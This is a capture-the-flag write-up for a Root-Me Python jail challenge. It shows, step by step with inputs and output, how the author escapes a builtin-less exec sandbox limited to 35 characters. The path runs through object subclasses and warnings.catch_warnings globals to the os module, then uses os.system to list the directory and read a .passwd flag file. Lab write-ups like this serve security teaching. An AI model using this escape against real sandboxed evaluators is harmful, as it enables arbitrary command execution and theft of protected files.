```
 	ssh -p 2222 app-script-ch10@challenge02.root-me.org
```

This one took me a lot of time and a lot of reading.


```
3+4
Result: 7
a=3
Result: 3
a
Error:  name 'a' is not defined
print(a)
Error:  invalid syntax (<string>, line 1)
help()
Error:  name 'help' is not defined
exit()
Error:  name 'exit' is not defined
```
After trying a lot of built_ins, we see that none of them is defined. The goal will be to find a way to retrieve them.

But before anything, you can try exit the shell by pressing **Ctrl+Shift+C**.

```
^CError in sys.excepthook:
Traceback (most recent call last):
  File "/usr/lib/python2.7/dist-packages/apport_python_hook.py", line 49, in apport_excepthook
    if exc_type in (KeyboardInterrupt, ):
NameError: global name 'KeyboardInterrupt' is not defined

Original exception was:
Traceback (most recent call last):
  File "/challenge/app-script/ch10/ch10.py", line 20, in <module>
    exec 'result = ' + saved_raw_input()[:35] in vars
KeyboardInterrupt
Connection to challenge02.root-me.org closed.
```

We see that our input is taken in the script, then, only the first 35 chars are taken, and the code is executed thanks to **exec**.

```
().__class__
Result: <type 'tuple'>
__builtins__
Result: {}
```

Here is our saviors.

```
__builtins__['x']=().__class__
Result: <type 'tuple'>
__builtins__['x']=x.__base__
Result: <type 'object'>
__builtins__['x']=x.__subclasses__
Result: <built-in method __subclasses__ of type object at 0x832f9a0>
__builtins__['x']=x()
Result: [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```

We do it step by step, because of the limit of 35 characters. Then, we can read the documentation about all of this types. We find out that we can use warnings.catch_warnings.

```
__builtins__['x']=x[59].__init__
Result: <unbound method catch_warnings.__init__>
__builtins__['x']=x.__globals__
Result: {'filterwarnings': <function filterwarnings at 0xb7b2d8b4>, 'once_registry': {}, 'WarningMessage': <class 'warnings.WarningMessage'>, '_show_warning': <function _show_warning at 0xb7b2d87c>, 'filters': [('ignore', None, <type 'exceptions.DeprecationWarning'>, None, 0), ('ignore', None, <type 'exceptions.PendingDeprecationWarning'>, None, 0), ('ignore', None, <type 'exceptions.ImportWarning'>, None, 0), ('ignore', None, <type 'exceptions.BytesWarning'>, None, 0)], '_setoption': <function _setoption at 0xb7b2d9cc>, 'showwarning': <function _show_warning at 0xb7b2d87c>, '__all__': ['warn', 'showwarning', 'formatwarning', 'filterwarnings', 'resetwarnings', 'catch_warnings'], 'onceregistry': {}, '__package__': None, 'simplefilter': <function simplefilter at 0xb7b2d924>, 'default_action': 'default', '_getcategory': <function _getcategory at 0xb7b2da3c>, '__builtins__': {'wg': {...}, 's': [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>], 'b': {...}, 'o': <type 'object'>}, 'catch_warnings': <class 'warnings.catch_warnings'>, '__file__': '/usr/lib/python2.7/warnings.pyc', 'warnpy3k': <function warnpy3k at 0xb7b2d8ec>, 'sys': <module 'sys' (built-in)>, '__name__': 'warnings', 'warn_explicit': <built-in function warn_explicit>, 'types': <module 'types' from '/usr/lib/python2.7/types.pyc'>, 'warn': <built-in function warn>, '_processoptions': <function _processoptions at 0xb7b2d994>, 'defaultaction': 'default', '__doc__': 'Python part of the warnings subsystem.', 'linecache': <module 'linecache' from '/usr/lib/python2.7/linecache.pyc'>, '_OptionError': <class 'warnings._OptionError'>, 'resetwarnings': <function resetwarnings at 0xb7b2d95c>, 'formatwarning': <function formatwarning at 0xb7b2d844>, '_getaction': <function _getaction at 0xb7b2da04>}

__builtins__['b']=__builtins__
b['os'] = x['linecache'].os
```


Then, it's basically done, we found the module os.

```
os.system('ls')
GetTheFlagInThisDirectory  ch10.py
Result: 0
b['f']='GetTheFlagInThisDirectory'
Result: GetTheFlagInThisDirectory
os.system('cat %s/.passwd'%f)
FLAG
Result: 0
```
